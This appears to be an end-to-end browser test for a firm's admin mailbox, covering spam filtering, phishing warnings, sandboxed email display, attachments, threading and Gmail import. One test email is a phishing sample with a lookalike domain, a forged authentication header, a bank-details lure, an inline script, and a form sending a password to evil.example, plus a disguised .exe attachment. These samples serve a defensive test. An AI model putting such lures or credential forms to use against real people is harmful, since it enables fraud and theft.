// Dashboard mailbox: real emails through the awal-mail Worker (ops/mail-worker.js) into the dashboard,
// security warnings, safe display, attachments, replies that thread, sending limits on file types.
const { chromium } = require('playwright');const fs=require('fs');const {spawn,execSync}=require('child_process');const S=process.argv[2];const B='http://127.0.0.1:8788';const W='http://127.0.0.1:8799';
const ok=(c,m)=>console.log((c?'PASS ':'FAIL ')+m);
const emails=()=>fs.readFileSync(S+'/emails.jsonl','utf8').trim().split('\n').filter(Boolean).map(JSON.parse);
const txt=async p=>(await p.textContent('body')).replace(/\s+/g,' ');
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const pdf=Buffer.from('%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n');
const png=Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==','base64');
const b64=b=>b.toString('base64').replace(/.{76}/g,'$&\r\n');
function eml({from,subject,msgid,inReplyTo,auth,html,text,atts=[],replyTo}){
  const bd='b'+Math.random().toString(36).slice(2);
  return [auth?`Authentication-Results: ${auth}`:null,`From: ${from}`,'To: info@awalglobal.com.ng',replyTo?`Reply-To: ${replyTo}`:null,`Subject: ${subject}`,`Message-ID: ${msgid}`,inReplyTo?`In-Reply-To: ${inReplyTo}`:null,inReplyTo?`References: ${inReplyTo}`:null,
   'Date: Fri, 20 Nov 2026 09:00:00 +0100','MIME-Version: 1.0',`Content-Type: multipart/mixed; boundary="${bd}"`,'',
   `--${bd}`,'Content-Type: multipart/alternative; boundary="alt'+bd+'"','',
   '--alt'+bd,'Content-Type: text/plain; charset=utf-8','',text||'Plain text','--alt'+bd,'Content-Type: text/html; charset=utf-8','',html||'<p>Hi</p>','--alt'+bd+'--',
   ...atts.flatMap(a=>[`--${bd}`,`Content-Type: ${a.type}; name="${a.name}"`,`Content-Disposition: ${a.inline?'inline':'attachment'}; filename="${a.name}"`,a.cid?`Content-ID: <${a.cid}>`:null,'Content-Transfer-Encoding: base64','',b64(a.data)].filter(x=>x!==null)),
   `--${bd}--`,''].filter(x=>x!==null).join('\r\n');
}
const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?from=${encodeURIComponent(from)}&to=info@awalglobal.com.ng`,{method:'POST',body:raw});return r.status};
(async()=>{
 // The mail Worker, sharing the local database and storage with the site
 fs.writeFileSync(S+'/mailw.toml',`name="awal-mail"\nmain="${process.cwd()}/ops/mail-worker.js"\ncompatibility_date="2025-09-01"\n[[d1_databases]]\nbinding="DB"\ndatabase_name="local-test"\ndatabase_id="local-test"\n[[r2_buckets]]\nbinding="DOCS"\nbucket_name="awal-documents"\n[vars]\nSITE_URL="${B}"\n`);
 const w=spawn(process.cwd()+'/tests/node_modules/.bin/wrangler',['dev','-c',S+'/mailw.toml','--port','8799','--ip','127.0.0.1','--persist-to',S+'/wrstate'],{stdio:['ignore',fs.openSync(S+'/mailw.log','w'),fs.openSync(S+'/mailw.log','a')]});
 for(let i=0;i<60;i++){try{if((await fetch(W)).ok)break}catch(e){}await sleep(1000)}
 const b=await chromium.launch();const a=await b.newPage({viewport:{width:390,height:844}});await a.addInitScript(()=>{try{localStorage.setItem('agc_app_panel','hide')}catch(e){}});
 try{
 // Not signed in: nothing is reachable
 ok((await fetch(B+'/cron/mail-in',{method:'POST',body:'{}'})).status===401,'mail-in endpoint refuses calls without the secret');
 // A client we already know
 const stamp=Date.now()%100000;const cEmail=`ngozi${stamp}@example.com`;
 await a.goto(B+'/admin/login');await a.fill('#email','info@awalglobal.com.ng');await a.click('button[type=submit]');
 const code=emails().filter(e=>/login code/.test(e.subject)).at(-1).subject.match(/(\d{6})/)[1];await a.fill('#code',code);await a.click('button[type=submit]');await a.waitForURL(B+'/admin/');
 await a.goto(B+'/admin/import');await a.fill('#i-name','Ngozi Okafor');await a.fill('#i-phone','0817'+String(stamp).padStart(7,'0'));await a.fill('#i-email',cEmail);
 await a.fill('#i-service','Business Name Registration');await a.fill('#i-date','2026-03-03');await a.click('form[action="/admin/import/one"] button[type=submit]');await a.waitForLoadState();
 const caseUrl=a.url().split('?')[0];
 // 1. A genuine client email with a PDF and an inline picture
 const m1=`<m1.${stamp}@example.com>`;
 ok(await deliver(cEmail,eml({from:`Ngozi Okafor <${cEmail}>`,subject:'My CAC documents',msgid:m1,auth:'mx.cloudflare.net; spf=pass smtp.mailfrom=example.com; dkim=pass; dmarc=pass',
   html:'<p>Good morning, please find my ID attached.</p><img src="cid:logo1"><img src="https://tracker.example/pixel.gif">',text:'Good morning, please find my ID attached.',
   atts:[{name:'my-id.pdf',type:'application/pdf',data:pdf},{name:'logo.png',type:'image/png',data:png,inline:true,cid:'logo1'}]}))<300,'Worker accepts the client email');
 // 2. A phishing email pretending to be us, with a fake verification header of its own
 ok(await deliver('billing@awa1global.com.ng',eml({from:'"Awal Global Accounts" <billing@awa1global.com.ng>',subject:'Urgent: change of bank details',msgid:`<p1.${stamp}@awa1global.com.ng>`,
   auth:'attacker.example; spf=pass; dkim=pass; dmarc=pass',replyTo:'payme@gmail.com',
   html:'<p onclick="steal()">Please note our change of bank details. <a href="https://evil.example/login">www.kudabank.com</a></p><script>alert(1)</script><form action="https://evil.example"><input name="pw"></form>',
   atts:[{name:'invoice.pdf.exe',type:'application/octet-stream',data:Buffer.from('MZ fake program')}]}))<300,'Worker accepts the phishing email (it never drops mail)');
 // Wait until the Worker and the site have both handled the two emails
 for(let i=0;i<30;i++){await a.goto(B+'/admin/mail?f=spam');if((await txt(a)).includes('change of bank details'))break;await sleep(1000);}
 // Inbox: the genuine email; the impersonation went straight to Spam
 await a.goto(B+'/admin/mail');let body=await txt(a);
 ok(body.includes('My CAC documents')&&!body.includes('Urgent: change of bank details'),'genuine email in the inbox, impersonation not');
 ok(/1 unread/.test(body),'unread count shows');
 ok(await a.locator('.bottom-nav a[href="/admin/mail"] .count').textContent()==='1','Mail badge on the navigation');
 ok(/Client/.test(await a.locator('.mail-row:has-text("My CAC documents")').textContent()),'client email is matched to the client');
 await a.goto(B+'/admin/mail?f=spam');
 ok(/Warning/.test(await a.locator('.mail-row:has-text("change of bank details")').textContent()),'impersonation is in Spam, flagged');
 // The phishing email
 await a.click('.mail-row:has-text("change of bank details")');await a.waitForLoadState();body=await txt(a);
 ok(body.includes('looks like ours but is not'),'warns about the lookalike domain');
 ok(body.includes('sender\'s name says "Awal Global Accounts"'),'warns about the fake Awal name');
 ok(body.includes('Replies will go to payme@gmail.com'),'warns about the different Reply-To');
 ok(body.includes('show one website but open another'),'warns about the deceptive link');
 ok(body.includes('changed bank or payment details'),'warns about the bank-details change');
 ok(body.includes('can run programs')&&await a.locator('a[data-confirm]:has-text("Download anyway")').count()===1,'program attachment is flagged and needs a confirmation');
 ok(!/Sender verified/.test(body),'a sender-written verification header is not trusted');
 const pid=a.url().split('/').pop().split('?')[0];
 const csp=(await a.evaluate(async u=>{const r=await fetch(u);return [r.headers.get('content-security-policy'),await r.text()]},`/admin/mail/${pid}/body`));
 ok(/sandbox/.test(csp[0])&&!/script-src/.test(csp[0])&&/default-src 'none'/.test(csp[0]),'email content is served sandboxed with no scripts allowed');
 ok(!/<script|onclick|<form|<input/i.test(csp[1]),'scripts, event handlers and forms are removed from the email');
 ok((await a.getAttribute('iframe.mail-frame','sandbox'))==='allow-popups allow-popups-to-escape-sandbox','the frame itself is sandboxed');
 // Unsigned visitors cannot read it
 const anon=await fetch(B+`/admin/mail/${pid}/body`,{redirect:'manual'});ok(anon.status===303||anon.status===302||anon.status===401,'signed-out visitors cannot read emails');
 // Block the sender: their next email skips the inbox
 await a.click('button[value=block]');await a.waitForLoadState();ok((await txt(a)).includes('Sender blocked'),'sender blocked');
 await deliver('billing@awa1global.com.ng',eml({from:'billing@awa1global.com.ng',subject:'Second try',msgid:`<p2.${stamp}@awa1global.com.ng>`,auth:'mx.cloudflare.net; spf=pass; dkim=pass; dmarc=pass',html:'<p>hello</p>'}));
 await sleep(2000);await a.goto(B+'/admin/mail');ok(!(await txt(a)).includes('Second try'),'blocked sender stays out of the inbox');
 await a.goto(B+'/admin/mail?f=spam');ok((await txt(a)).includes('Second try'),'and lands in Spam');
 // The client email
 await a.goto(B+'/admin/mail');await a.click('.mail-row:has-text("My CAC documents")');await a.waitForLoadState();body=await txt(a);
 ok(body.includes('Sender verified (example.com)'),'genuine sender shows as verified');
 ok(body.includes('Ngozi Okafor (client)'),'links to the client');
 ok(body.includes('my-id.pdf')&&!body.includes('logo.png'),'attachment listed, inline picture not');
 ok(body.includes('Pictures from the internet are hidden'),'remote pictures blocked by default');
 const mid=a.url().split('/').pop().split('?')[0];
 const frame=await a.evaluate(async u=>(await fetch(u)).text(),`/admin/mail/${mid}/body`);
 ok(frame.includes('data:image/png;base64')&&frame.includes('data-blocked'),'inline picture shown, tracking pixel blocked');
 const withImg=await a.evaluate(async u=>(await fetch(u)).headers.get('content-security-policy'),`/admin/mail/${mid}/body?images=1`);ok(/img-src data: https:/.test(withImg),'pictures load only when asked');
 const dl=await a.evaluate(async u=>{const r=await fetch(u);return [r.headers.get('content-type'),r.headers.get('content-disposition'),(await r.text()).slice(0,8)]},`/admin/mail/${mid}/att/0`);
 ok(dl[0]==='application/octet-stream'&&/^attachment/.test(dl[1])&&dl[2]==='%PDF-1.4','attachment downloads as a file');
 await a.locator('summary:has-text("Save to a case")').click();await a.click('form[action$="/to-case"] button');await a.waitForLoadState();
 ok((await txt(a)).includes('Attachment saved to the case documents'),'PDF saved to the case');
 await a.goto(caseUrl+'?tab=documents');ok((await txt(a)).includes('from-email--my-id.pdf'),'it appears in the case documents');
 // Reply
 await a.goto(B+`/admin/mail/${mid}`);await a.click('a.btn:has-text("Reply")');await a.waitForLoadState();
 ok(await a.inputValue('#m-to')===cEmail&&await a.inputValue('#m-subject')==='Re: My CAC documents','reply is addressed and titled');
 ok((await a.inputValue('#m-body')).includes('> Good morning, please find my ID attached.'),'reply quotes the original');
 await a.fill('#m-body','Thank you Ngozi, received. We will file today.\n\n'+(await a.inputValue('#m-body')));
 await a.setInputFiles('#m-files',[{name:'checklist.pdf',mimeType:'application/pdf',buffer:pdf}]);
 await a.waitForSelector('.att-chip:has-text("checklist.pdf")');
 ok(/Saved in Drafts/.test(await a.textContent('.draft-status')),'reply is saved to Drafts while typing');
 await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();body=await txt(a);
 const sent=emails().filter(e=>e.subject==='Re: My CAC documents').at(-1);
 ok(body.includes('Email sent.'),'reply sent');
 ok(sent&&sent.sender.email==='info@awalglobal.com.ng'&&sent.to[0].email===cEmail,'sent from info@ to the client');
 ok(sent&&sent.headers&&sent.headers['In-Reply-To']===m1&&sent.headers.References.includes(m1),'threading headers set');
 ok(sent&&sent.attachment.length===1&&sent.attachment[0].name==='checklist.pdf','attachment sent');
 ok(sent&&!/<script/i.test(sent.html)&&sent.html.includes('Thank you Ngozi')&&sent.html.includes('logo-mark.png')&&sent.html.includes('Client Services'),'message body sent as clean HTML with the info@ signature');
 ok(await a.locator('.mail-msg').count()===2&&/Awal Global Consults <info@awalglobal\.com\.ng>/.test(body),'reply shows in the conversation');
 // The client answers our reply: it joins the same conversation
 await deliver(cEmail,eml({from:`Ngozi Okafor <${cEmail}>`,subject:'Re: Re: My CAC documents',msgid:`<m3.${stamp}@example.com>`,inReplyTo:sent.messageId,auth:'mx.cloudflare.net; spf=pass; dkim=pass; dmarc=pass',html:'<p>Thanks!</p>',text:'Thanks!'}));
 await sleep(2000);await a.goto(B+'/admin/mail');
 ok(await a.locator('.mail-row:has-text("Ngozi")').count()===1&&/\(3\)/.test(await a.locator('.mail-row:has-text("Ngozi")').textContent()),'client reply threads into one conversation of 3');
 await a.click('.mail-row:has-text("Ngozi")');await a.waitForLoadState();
 ok((await a.frameLocator('iframe.mail-frame').last().locator('body').textContent({timeout:10000})).includes('Thanks!'),'email text shows inside the safe frame');
 // Unsafe attachment cannot be added
 await a.goto(B+'/admin/mail/new?to='+encodeURIComponent(cEmail));await a.fill('#m-subject','Test');await a.fill('#m-body','Hello');
 let dialogMsg='';a.once('dialog',d=>{dialogMsg=d.message();d.dismiss()});
 await a.setInputFiles('#m-files',[{name:'tool.exe',mimeType:'application/octet-stream',buffer:Buffer.from('MZ')}]);await sleep(2500);
 ok(/can carry malware/.test(dialogMsg)&&await a.locator('.att-chip').count()===0,'program files cannot be attached');
 await a.fill('#m-to','not-an-email');await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();
 ok((await txt(a)).includes("don't look right"),'bad addresses refused');
 // ── Sending as the founder, with his own signature
 await a.goto(B+'/admin/mail/new');
 const froms=await a.$$eval('#m-from option',o=>o.map(x=>x.value));
 ok(froms.join()==='info@awalglobal.com.ng,contact@awalglobal.com.ng,abdullateef@awalglobal.com.ng','info@, contact@ and abdullateef@ to send from');
 await a.selectOption('#m-from','abdullateef@awalglobal.com.ng');
 ok((await a.textContent('.sig-preview')).includes('Abdullateef Olamilekan Abdulwaheed'),'signature switches with the sender');
 await a.fill('#m-to',cEmail);await a.fill('#m-subject','A note from the founder '+stamp);await a.fill('#m-body','Dear Ngozi,\n\nThank you for choosing us.');
 await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();
 const fsent=emails().filter(e=>e.subject==='A note from the founder '+stamp).at(-1);
 ok(fsent&&fsent.sender.email==='abdullateef@awalglobal.com.ng'&&fsent.sender.name==='Abdullateef Olamilekan Abdulwaheed'&&fsent.replyTo.email==='abdullateef@awalglobal.com.ng','sent as the founder');
 ok(fsent&&fsent.html.includes('Founder; Governance, Risk and Compliance')&&!fsent.html.includes('Client Services'),'with the founder signature');
 // A reply goes out from the address the client wrote to
 await fetch(`${W}/cdn-cgi/handler/email?from=${encodeURIComponent(cEmail)}&to=contact@awalglobal.com.ng`,{method:'POST',body:eml({from:cEmail,subject:'Enquiry to contact',msgid:`<c1.${stamp}@example.com>`,auth:'mx.cloudflare.net; spf=pass; dkim=pass; dmarc=pass',html:'<p>Hello contact</p>'}).replace('To: info@awalglobal.com.ng','To: contact@awalglobal.com.ng')});
 await sleep(2000);await a.goto(B+'/admin/mail?box=contact%40awalglobal.com.ng');ok((await txt(a)).includes('Enquiry to contact')&&!(await txt(a)).includes('My CAC documents'),'filter by address');
 await a.click('.mail-row:has-text("Enquiry to contact")');await a.click('a.btn:has-text("Reply")');await a.waitForLoadState();
 ok(await a.inputValue('#m-from')==='contact@awalglobal.com.ng','reply is from contact@, where it was sent');
 // ── Drafts follow you between devices
 await a.goto(B+'/admin/mail/new');await a.fill('#m-to','partner@example.com');await a.fill('#m-subject','Draft on the phone '+stamp);await a.fill('#m-body','Half-written on my phone');
 await a.waitForFunction(()=>/Saved in Drafts/.test(document.querySelector('.draft-status').textContent),null,{timeout:10000});
 ok(/draft=/.test(a.url()),'draft gets its own link');
 await a.setInputFiles('#m-files',[{name:'notes.pdf',mimeType:'application/pdf',buffer:pdf}]);await a.waitForSelector('.att-chip:has-text("notes.pdf")');
 const web=await b.newContext({viewport:{width:1280,height:900},storageState:await a.context().storageState()});const p2=await web.newPage();
 await p2.goto(B+'/admin/mail?f=drafts');ok((await txt(p2)).includes('Draft on the phone '+stamp),'draft listed in Drafts on another device');
 await p2.click('.mail-row:has-text("Draft on the phone")');await p2.waitForLoadState();
 ok(await p2.inputValue('#m-body')==='Half-written on my phone'&&await p2.locator('.att-chip:has-text("notes.pdf")').count()===1,'draft opens with its text and attachment on the web');
 await p2.fill('#m-body','Finished on the computer');await p2.click('.mail-compose button[type=submit]:has-text("Send")');await p2.waitForLoadState();
 const dsent=emails().filter(e=>e.subject==='Draft on the phone '+stamp).at(-1);
 ok(dsent&&dsent.text.startsWith('Finished on the computer')&&dsent.attachment.length===1&&dsent.attachment[0].name==='notes.pdf','draft sent with its attachment');
 await p2.goto(B+'/admin/mail?f=drafts');ok(!(await txt(p2)).includes('Draft on the phone '+stamp),'sent draft leaves Drafts');
 await web.close();
 // ── Delivered and read ticks
 const tok=JSON.parse(execSync(`cd ${S} && ${process.cwd()}/tests/node_modules/.bin/wrangler d1 execute local-test --local -c wr.toml --persist-to wrstate --json --command "SELECT value FROM app_settings WHERE key='brevo_mail_webhook'"`).toString().replace(/^[^\[]*/,''))[0].results[0].value;
 const hookUrl=B+'/hooks/brevo?k='+JSON.parse(tok).token;
 await a.goto(B+'/admin/mail?f=sent');ok(await a.locator('.mail-row:has-text("A note from the founder") .tick-sent').count()===1,'one tick: sent');
 await fetch(hookUrl,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({event:'delivered',email:cEmail,'message-id':fsent.messageId,date:'2026-11-20 10:00:00'})});
 await a.reload();ok(await a.locator('.mail-row:has-text("A note from the founder") .tick-delivered').count()===1,'two grey ticks: delivered');
 await fetch(hookUrl,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({event:'opened',email:cEmail,'message-id':fsent.messageId,date:'2026-11-20 10:05:00'})});
 await a.reload();ok(await a.locator('.mail-row:has-text("A note from the founder") .tick-read').count()===1,'two blue ticks: read');
 ok((await fetch(B+'/hooks/brevo?k=wrong',{method:'POST',body:'{}'})).status===403,'tick events need the secret token');
 // Trash and restore
 await a.goto(B+`/admin/mail/${mid}`);await a.click('button[value=trash]');await a.waitForLoadState();
 await a.goto(B+'/admin/mail?f=trash');ok((await txt(a)).includes('My CAC documents'),'deleted conversation is in Trash');
 await a.click('.mail-row:has-text("Ngozi")');await a.click('button[value=restore]');await a.waitForLoadState();
 await a.goto(B+'/admin/mail');ok((await txt(a)).includes('My CAC documents'),'restored to the inbox');
 // Activity log
 await a.goto(B+'/admin/activity?filter=mail');body=await txt(a);ok(body.includes('Email sent from the mailbox')&&body.includes('Email attachment downloaded'),'sending and downloads are in the activity log');
 // Client export includes the emails
 await a.goto(B+'/admin/mail');await a.click('.mail-row:has-text("Ngozi")');await a.waitForLoadState();
 const clientHref=await a.getAttribute('a[href^="/admin/client/"]','href');
 const ex=await a.evaluate(async u=>(await fetch(u)).json(),clientHref+'/export');ok(Array.isArray(ex.emails)&&ex.emails.length>=3,'client data export includes their emails');
 // ── Importing past mail from Gmail (Takeout .mbox and a single .eml)
 const d1=`<daniel1.${stamp}@acruxx.example>`;
 const mk=(lines)=>lines.join('\r\n')+'\r\n';
 const danielMsg=mk(['X-Gmail-Labels: Inbox,Important','Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=acruxx.example; dkim=pass; dmarc=pass','From: Daniel Iyaki <daniel@acruxx.example>','To: abdullateef@awalglobal.com.ng','Subject: Follow-up on SCUML '+stamp,`Message-ID: ${d1}`,'Date: Thu, 19 Nov 2026 10:00:00 +0100','Content-Type: text/plain; charset=utf-8','','Dear Abdullateef,','>From the desk of Daniel','Could you confirm the status?']);
 const personal=mk(['X-Gmail-Labels: Inbox','From: Shop <deals@shop.example>','To: someone@gmail.com','Subject: Big sale '+stamp,`Message-ID: <sale.${stamp}@shop.example>`,'Date: Thu, 19 Nov 2026 11:00:00 +0100','','Buy now']);
 const gmailReply=mk(['X-Gmail-Labels: Sent','From: Awal Gmail <awal.office@gmail.com>','To: daniel@acruxx.example','Subject: Re: Follow-up on SCUML '+stamp,`Message-ID: <reply.${stamp}@mail.gmail.com>`,`In-Reply-To: ${d1}`,`References: ${d1}`,'Date: Thu, 19 Nov 2026 12:00:00 +0100','','Noted, Daniel.']);
 const trashed=mk(['X-Gmail-Labels: Trash','From: x@acruxx.example','To: info@awalglobal.com.ng','Subject: deleted one '+stamp,`Message-ID: <trash.${stamp}@x>`,'Date: Thu, 19 Nov 2026 13:00:00 +0100','','gone']);
 // Sent reply first in the file: it must still join Daniel's conversation
 const mbox=['From 1 Thu Nov 19 10:00:00 2026','From 2 Thu Nov 19 11:00:00 2026','From 3 Thu Nov 19 12:00:00 2026','From 4 Thu Nov 19 13:00:00 2026'];
 const mboxText=mbox[2]+'\n'+gmailReply+'\n'+mbox[0]+'\n'+danielMsg+'\n'+mbox[1]+'\n'+personal+'\n'+mbox[3]+'\n'+trashed;
 await a.goto(B+'/admin/mail');await a.click('a.btn:has-text("Import")');await a.waitForLoadState();
 await a.setInputFiles('#imp-files',[{name:'All mail Including Spam and Trash.mbox',mimeType:'application/mbox',buffer:Buffer.from(mboxText)}]);
 await a.waitForFunction(()=>/finished/.test(document.querySelector('.imp-text').textContent),null,{timeout:60000});
 const impText=await a.textContent('.imp-text');
 ok(/4 of 4 read · 2 imported · 0 already here · 2 not for your domain/.test(impText),'mbox import: Daniel and the Gmail reply in, personal and trashed mail out ('+impText.slice(0,80)+')');
 await a.setInputFiles('#imp-files',[{name:'Follow-up.eml',mimeType:'message/rfc822',buffer:Buffer.from(danielMsg)}]);
 await a.waitForFunction(()=>/finished/.test(document.querySelector('.imp-text').textContent)&&/1 of 1/.test(document.querySelector('.imp-text').textContent),null,{timeout:30000});
 ok(/1 already here/.test(await a.textContent('.imp-text')),'importing the same email again is skipped');
 await a.goto(B+'/admin/mail?box=abdullateef%40awalglobal.com.ng');body=await txt(a);
 ok(body.includes('Follow-up on SCUML '+stamp)&&!body.includes('Big sale'),'imported email is in the inbox under abdullateef@');
 await a.click(`.mail-row:has-text("Follow-up on SCUML ${stamp}")`);await a.waitForLoadState();body=await txt(a);
 ok(await a.locator('.mail-msg').count()===2&&body.includes('Sender verified (acruxx.example)'),'conversation holds Daniel and the earlier Gmail reply; Gmail verdict kept');
 ok((await a.frameLocator('iframe.mail-frame').first().locator('body').textContent({timeout:10000})).includes('From the desk of Daniel'),'imported text shows');
 await a.click('a.btn:has-text("Reply")');await a.waitForLoadState();
 ok(await a.inputValue('#m-from')==='abdullateef@awalglobal.com.ng'&&await a.inputValue('#m-to')==='daniel@acruxx.example'&&await a.inputValue('#m-subject')==='Re: Follow-up on SCUML '+stamp,'reply goes from abdullateef@ to Daniel in the same conversation');
 await a.fill('#m-body','Dear Daniel, update below.\n\n'+(await a.inputValue('#m-body')));await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();
 const dr=emails().filter(e=>e.subject==='Re: Follow-up on SCUML '+stamp).at(-1);
 ok(dr&&dr.headers['In-Reply-To']===d1&&dr.sender.email==='abdullateef@awalglobal.com.ng','reply threads on Daniel\'s side (In-Reply-To his email)');
 await a.screenshot({path:S+'/mail-thread.png',fullPage:true});
 await a.goto(B+'/admin/mail?f=sent');await a.screenshot({path:S+'/mail-sent.png',fullPage:true});
 await a.goto(B+'/admin/mail/new?from=abdullateef%40awalglobal.com.ng');await a.screenshot({path:S+'/mail-compose.png',fullPage:true});
 await a.goto(B+'/admin/settings');await a.screenshot({path:S+'/settings.png',fullPage:true});
 await a.goto(B+'/admin/mail?f=spam');await a.click('.mail-row');await a.waitForLoadState();await a.screenshot({path:S+'/mail-phish.png',fullPage:true});
 } finally { await b.close(); w.kill(); }
})().catch(e=>{console.log('ERR',e.message.split('\n')[0]);process.exit(1)});
